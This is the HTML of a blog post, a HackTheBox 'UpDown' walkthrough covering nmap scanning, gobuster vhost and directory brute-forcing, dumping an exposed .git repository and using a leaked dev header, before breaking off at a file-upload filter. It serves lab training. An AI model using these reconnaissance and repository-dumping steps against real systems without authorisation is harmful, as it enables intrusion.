@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hackthebox - UpDown - Saad Akhtar</title><meta name="Description" content="Hackthebox medium machine UpDown walkthrough &amp; tutorial.."><meta property="og:title" content="Hackthebox - UpDown" />
+<meta property="og:description" content="Hackthebox medium machine UpDown walkthrough &amp; tutorial.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-updown/" /><meta property="og:image" content="/hackthebox-updown/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-21T17:00:21+05:00" />
+<meta property="article:modified_time" content="2023-01-21T17:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-updown/0.png"/>
+<meta name="twitter:title" content="Hackthebox - UpDown"/>
+<meta name="twitter:description" content="Hackthebox medium machine UpDown walkthrough &amp; tutorial.."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-updown/" /><link rel="prev" href="/hackthebox-shoppy/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hackthebox - UpDown",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-updown\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-updown\/0.png",
+                            "width":  1388 ,
+                            "height":  1058 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1654 ,
+        "url": "\/hackthebox-updown\/","datePublished": "2023-01-21T17:00:21+05:00","dateModified": "2023-01-21T17:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Hackthebox medium machine UpDown walkthrough \u0026 tutorial.."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - UpDown</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-21">2023-01-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1654 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-updown/0.png"
+        data-srcset="/hackthebox-updown/0.png, /hackthebox-updown/0.png 1.5x, /hackthebox-updown/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-updown/0.png"
+        title="Hackthebox medium machine UpDown walkthrough &amp; tutorial.." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#www-data---developer">www-data -&gt; developer</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Medium Machine UpDown from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/updown<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv -oN nmapN 10.10.11.177                                   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Only 2 ports are open so enumerating port 80 first.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/1.png" title="Website" data-thumbnail="/hackthebox-updown/1.png" data-sub-html="<h2>Website</h2><p>Website</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/1.png"
+            data-srcset="/hackthebox-updown/1.png, /hackthebox-updown/1.png 1.5x, /hackthebox-updown/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/1.png" width="1366" height="582" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>The website serves a basic functionality and checks whether a site is up or down.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/2.png" title="Functionality" data-thumbnail="/hackthebox-updown/2.png" data-sub-html="<h2>Functionality</h2><p>Functionality</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/2.png"
+            data-srcset="/hackthebox-updown/2.png, /hackthebox-updown/2.png 1.5x, /hackthebox-updown/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/2.png" width="1366" height="579" />
+    </a><figcaption class="image-caption">Functionality</figcaption>
+    </figure></p>
+<p>Also there is a domain <code>siteisup.htb</code> which we&rsquo;ll add to our <code>/etc/hosts/</code> file.</p>
+<p>Since there&rsquo;s not much else to look for on the main page, we&rsquo;ll go for directory and vhost bruteforcing.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/updown<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster vhost -u siteisup.htb -w /home/saad/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t <span class="m">100</span> -o <span class="nv">vhosts</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:          http://siteisup.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:       GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">100</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:     /home/saad/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:31:21 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Found: dev.siteisup.htb <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 281<span class="o">]</span>
+</span></span><span class="line"><span class="cl">                                                 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:31:32 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Found a subdomain <code>dev.siteisup.htb</code>.</p>
+<p>Visiting the above domain, we get a <code>403</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/3.png" title="403" data-thumbnail="/hackthebox-updown/3.png" data-sub-html="<h2>403 Forbidden</h2><p>403</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/3.png"
+            data-srcset="/hackthebox-updown/3.png, /hackthebox-updown/3.png 1.5x, /hackthebox-updown/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/3.png" width="1366" height="574" />
+    </a><figcaption class="image-caption">403 Forbidden</figcaption>
+    </figure></p>
+<p>Going for directory bruteforcing now.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/updown<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirb/common.txt -o dir -t <span class="nv">100</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://siteisup.htb/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">100</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:32:47 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/dev                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310<span class="o">]</span> <span class="o">[</span>--&gt; http://siteisup.htb/dev/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1131<span class="o">]</span>                              
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>                               
+</span></span><span class="line"><span class="cl">                                                                              
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:32:55 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We found an interesting directory <code>dev</code>. Doing dir bruteforcing on that directory gives us a <code>.git</code> repo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/updown<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/dirb/common.txt -o dir-dev -t <span class="nv">100</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://siteisup.htb/dev
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">100</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:33:09 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 21<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>  
+</span></span><span class="line"><span class="cl">                                               
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2022/09/10 07:33:15 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the <a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener noreffer ">git-dumper</a> tool, we can dump the git repo and analyze it locally.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/Desktop/hackthebox/machines/updown<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ git-dumper http://siteisup.htb/dev dev
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get a bunch of files as well along with the <code>git</code> repo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/updown/dev<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">40</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> saad saad <span class="m">4096</span> Sep <span class="m">10</span> 07:41 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> saad saad <span class="m">4096</span> Sep <span class="m">10</span> 07:41 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad   <span class="m">59</span> Sep <span class="m">10</span> 07:41 admin.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad  <span class="m">147</span> Sep <span class="m">10</span> 07:41 changelog.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad <span class="m">3145</span> Sep <span class="m">10</span> 07:41 checker.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> saad saad <span class="m">4096</span> Sep <span class="m">10</span> 07:41 .git
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad  <span class="m">117</span> Sep <span class="m">10</span> 07:41 .htaccess
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad  <span class="m">273</span> Sep <span class="m">10</span> 07:41 index.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> saad saad <span class="m">5531</span> Sep <span class="m">10</span> 07:41 stylesheet.css
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Going through <code>git</code> commits, an interesting commit revealed a way to access the <code>dev</code> vhost.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/4.png" title="git commit" data-thumbnail="/hackthebox-updown/4.png" data-sub-html="<h2>git commit</h2><p>git commit</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/4.png"
+            data-srcset="/hackthebox-updown/4.png, /hackthebox-updown/4.png 1.5x, /hackthebox-updown/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/4.png" width="1356" height="323" />
+    </a><figcaption class="image-caption">git commit</figcaption>
+    </figure></p>
+<p>This means that we need to add a header <code>Special-Dev</code> with value <code>only4dev</code> in order to access the <code>dev.siteisup.htb</code>.</p>
+<p>Following that we land on the main page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/5.png" title="dev.siteisup.htb" data-thumbnail="/hackthebox-updown/5.png" data-sub-html="<h2>dev.siteisup.htb</h2><p>dev.siteisup.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/5.png"
+            data-srcset="/hackthebox-updown/5.png, /hackthebox-updown/5.png 1.5x, /hackthebox-updown/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/5.png" width="1366" height="573" />
+    </a><figcaption class="image-caption">dev.siteisup.htb</figcaption>
+    </figure></p>
+<p>This site also has the same funcionality but instead of a single website we can check multiple by uploading a list of websites in a file.</p>
+<p>But wait! File upload means we can also upload some malicious file to execute right? Let&rsquo;s try that.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/6.png" title="Not Allowed" data-thumbnail="/hackthebox-updown/6.png" data-sub-html="<h2>Not Allowed</h2><p>Not Allowed</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/6.png"
+            data-srcset="/hackthebox-updown/6.png, /hackthebox-updown/6.png 1.5x, /hackthebox-updown/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/6.png" width="1366" height="578" />
+    </a><figcaption class="image-caption">Not Allowed</figcaption>
+    </figure></p>
+<p>Sadly uploading the <code>php</code> file tells us extension not allowed.</p>
+<p>But we also have the source code so looking at the previously dumped <code>checker.php</code> file we can see the filtering.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/7.png" title="File upload filtering" data-thumbnail="/hackthebox-updown/7.png" data-sub-html="<h2>File upload filtering</h2><p>File upload filtering</p>">
+        <img
+            class="lazyload"
